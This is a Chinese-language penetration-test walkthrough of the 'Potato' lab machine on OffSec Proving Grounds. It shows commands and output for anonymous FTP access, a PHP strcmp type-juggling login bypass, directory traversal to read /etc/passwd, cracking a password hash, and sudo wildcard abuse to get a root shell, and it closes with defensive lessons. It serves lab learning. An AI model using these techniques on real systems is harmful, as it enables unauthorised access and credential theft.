# Potato 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：OffSec Proving Grounds (Play)
> - **作業系統**：linux
> - **難易度**：easy
> - **開始時間**：2026-07-06

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 快速連接埠掃描 (RustScan / Nmap)
使用 RustScan 與 Nmap 對目標 IP 進行掃描以定位開放的服務與連接埠：
```bash
┌──(kali㉿kali)-[~]
└─$ rustscan -a 192.168.182.101 -- -sV

.......

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
2112/tcp open  ftp     syn-ack ttl 61 ProFTPD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version) | 備註 / 潛在漏洞點 |
| ---------- | ------------ | ------------ | ---------- |
| 22/tcp     | SSH          | OpenSSH 8.2p1 Ubuntu | 遠端管理服務，可用於後續 Shell 登入。 |
| 80/tcp     | HTTP         | Apache httpd 2.4.41 | 網頁伺服器，可能存在登入後台或敏感路徑。 |
| 2112/tcp   | FTP          | ProFTPD      | FTP 伺服器，允許匿名登入，存有敏感備份檔。 |

---

### 📂 FTP 服務列舉 (Port 2112)
發現 FTP 服務允許匿名登入（Anonymous login allowed，狀態碼 230）。使用 anonymous 登入並獲取檔案：
```bash
┌──(kali㉿kali)-[~/Desktop/PG/Potato]
└─$ ftp 192.168.182.101 2112
Connected to 192.168.182.101.
220 ProFTPD Server (Debian) [::ffff:192.168.182.101]
Name (192.168.182.101:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.45.239 !
230-
230-The local time is: Sun Jul 05 18:53:13 2026
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45740|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp           901 Aug  2  2020 index.php.bak
-rw-r--r--   1 ftp      ftp            54 Aug  2  2020 welcome.msg
226 Transfer complete
ftp> get index.php.bak
....... 
226 Transfer complete
901 bytes received in 00:00 (13.87 KiB/s)
ftp> get welcome.msg
....... 
226 Transfer complete
54 bytes received in 00:00 (0.81 KiB/s)
ftp> exit
221 Goodbye.
```
下載了 `index.php.bak` , `welcome.msg`。

---

### 🌐 網頁服務列舉 (Web Enumeration)
訪問網頁首頁 `http://192.168.127.101/`，為一個普通的靜態首頁，且 `/robots.txt` 無敏感發現。
使用 `gobuster` 或 `ffuf` 進行目錄爆破：
```bash
┌──(kali㉿kali)-[~/Desktop/PG/Potato]
└─$ gobuster dir -u http://192.168.182.101/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50 -b 403,404
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.182.101/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

.......

admin                (Status: 301) [Size: 318] [--> http://192.168.182.101/admin/]
index.php            (Status: 200) [Size: 245]
index.php            (Status: 200) [Size: 245]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```
發現 `/admin` 目錄，訪問後會被重新導向至 `http://192.168.127.101/admin/`，是一個管理員登入頁面。
![](image/Pasted%20image%2020260706030157.png)

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析 (Vulnerability Assessment)
1. **PHP 弱型別比較漏洞 (Type Juggling)**
   審查從 FTP 下載的 `index.php.bak`：
	```php
	<?php
	
	$pass= "potato"; //note Change this password regularly
	
	if($_GET['login']==="1"){
	  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {
	    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";
	    setcookie('pass', $pass, time() + 365*24*3600);
	  }else{
	    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";
	  }
	  exit();
	}
	?>
	```
   - 後端採用 `strcmp($_POST['password'], $pass) == 0` 來驗證密碼是否與秘密密碼 `$pass` 相同。
   - 當我們將 `$_POST['password']` 以**陣列**傳遞（例如 `password[]=`）時，`strcmp()` 會因為型態不符而返回 `NULL`。
   - 由於使用的是鬆散比較 `==`，在 PHP 中 `NULL == 0` 會判定為 `true`，從而成功繞過密碼驗證。

2. **目錄走訪漏洞 (Directory Traversal)**
   繞過登入後，進入 `dashboard.php`，此頁面具備檢視日誌功能。該功能的 Http 請求中包含 `file` 參數來讀取指定的日誌檔案。
   - 由於後端沒有對 `file` 參數做路徑限制，攻擊者可以使用相對路徑走訪字元（如 `../../../../etc/passwd`）讀取任意敏感檔案。

---

### 🔑 初始存取突破 (Exploitation)

#### 1. 繞過 Admin 後台登入
使用 Burp Suite 攔截登入 POST 請求，並將參數修改為陣列格式：
	![](image/Pasted%20image%2020260706031542.png)
	![](image/Pasted%20image%2020260706031710.png)
	![](image/Pasted%20image%2020260706031807.png)
	![](image/Pasted%20image%2020260706031848.png)
	成功登入 `/admin/dashboard.php`。

#### 2. 目錄走訪讀取 /etc/passwd 獲取 Hash
登入 dashboard 後，選擇一個日誌檔案並點選檢視，將請求發送到 Burp Repeater，藉由目錄走訪嘗試讀取 `/etc/passwd`：
	![](image/Pasted%20image%2020260706032157.png)
	![](image/Pasted%20image%2020260706032249.png)
	![](image/Pasted%20image%2020260706032422.png)

成功取得 `/etc/passwd` 的內容，並且在檔案中發現了使用者 `webadmin` 的密碼 Hash 直接被寫入在檔案內：
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
proftpd:x:112:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:113:65534::/srv/ftp:/usr/sbin/nologin
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```

#### 3. 破解 Hash 並以 SSH 登入
將 hash 存入本地的 `hash.txt` 檔案：
```bash
┌──(kali㉿kali)-[~]
└─$ echo '$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/' > hash.txt
```
使用 John the Ripper 或 Hashcat 進行破解：
```bash
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Created directory: /home/kali/.john
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragon           (?)     
1g 0:00:00:00 DONE (2026-07-05 15:38) 100.0g/s 38400p/s 38400c/s 38400C/s 123456..michael1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
解出密碼為：`dragon`。

使用 SSH 成功登入 `webadmin`：
```bash
┌──(kali㉿kali)-[~]
└─$ ssh webadmin@192.168.249.101                   
The authenticity of host '192.168.249.101 (192.168.249.101)' can't be established.
ED25519 key fingerprint is: SHA256:9DQds4tRzLVKtayQC3VgIo53wDRYtKzwBRgF14XKjCg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.249.101' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
webadmin@192.168.249.101's password:

.........

webadmin@serv:~$ find / -type f -name local.txt 2>/dev/null
/home/webadmin/local.txt
```

---

## 📈 3. 特權提升 (Privilege Escalation)

### 🕵️ 本地資訊收集 (Local Enumeration)
登入主機後，執行 `sudo -l` 檢視當前使用者的 sudo 特權：
```bash
webadmin@serv:~$ sudo -l
[sudo] password for webadmin: 
Matching Defaults entries for webadmin on serv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on serv:
    (ALL : ALL) /bin/nice /notes/*
```
- 普通使用者 `webadmin` 可以使用其密碼（即 `dragon`）執行 `/bin/nice /notes/*` 命令。
- `nice` 指令本身可以執行傳入的命令。
- `sudo` 配置中的萬用字元 `*` 可透過路徑走訪符號 `..` 來繞過限制，從而使我們能執行 `/notes/` 目錄之外的任意程式。

---

### 👑 提權利用 (Exploitation to Root / SYSTEM)

#### 方法 A：直接路徑走訪呼叫 Bash
由於 `nice` 能以 root 權限執行命令，且限制參數 `/notes/*` 被 `..` 繞過，我們可以直接執行：
```bash
webadmin@serv:~$ sudo /bin/nice /notes/../bin/bash
root@serv:/home/webadmin# whoami
root
```

#### 方法 B：執行家目錄內的自定義提權腳本
如果在某些限制環境下無法直接取得 bash，也可以在 `/home/webadmin` 目錄下建立一個提權腳本：
```bash
webadmin@serv:~$ pwd
/home/webadmin
webadmin@serv:~$ echo '#!/bin/bash' > shell.sh
webadmin@serv:~$ echo '/bin/bash -p' >> shell.sh
webadmin@serv:~$ chmod +x shell.sh 
webadmin@serv:~$ sudo /bin/nice /notes/../home/webadmin/shell.sh
root@serv:/home/webadmin# whoami
root
```
成功切換為 root 使用者，讀取 proof flag：
```bash
root@serv:/home/webadmin# find / -type f -name proof.txt 2>/dev/null
/root/proof.txt
```

---

## 💡 4. 心得與學習點 (Key Takeaways)

1. **PHP strcmp 與鬆散比較的陷阱**：在開發 PHP 應用程式時，應避免使用鬆散比較 `==` 來比對敏感字串（如密碼或憑證）。應使用嚴格比較 `===` 或是採用專用的密碼比對函數（如 `hash_equals()`）。
2. **目錄走訪防禦**：對於使用者可控的檔案路徑輸入，應使用 `basename()` 過濾或是實作嚴格的白名單機制，只允許讀取特定目錄下的特定檔案。
3. **密碼儲存最佳實踐**：不應將密碼的 Hash 直接寫在 `/etc/passwd` 檔案中，而應移至權限管制更嚴格的 `/etc/shadow` 中。此外應使用更強的加密演算法（如 Argon2 或 bcrypt），避免密碼長度過短或使用弱密碼而容易被爆破。
4. **Sudo 通配符配置漏洞**：Sudoers 設定中的 `*` 通配符非常危險，極易被目錄走訪 `..` 繞過。應避免在 `sudoers` 中使用通配符限制目錄，若有需要，應將目標腳本以絕對路徑方式明確寫出，且確保該腳本無法被一般使用者修改。
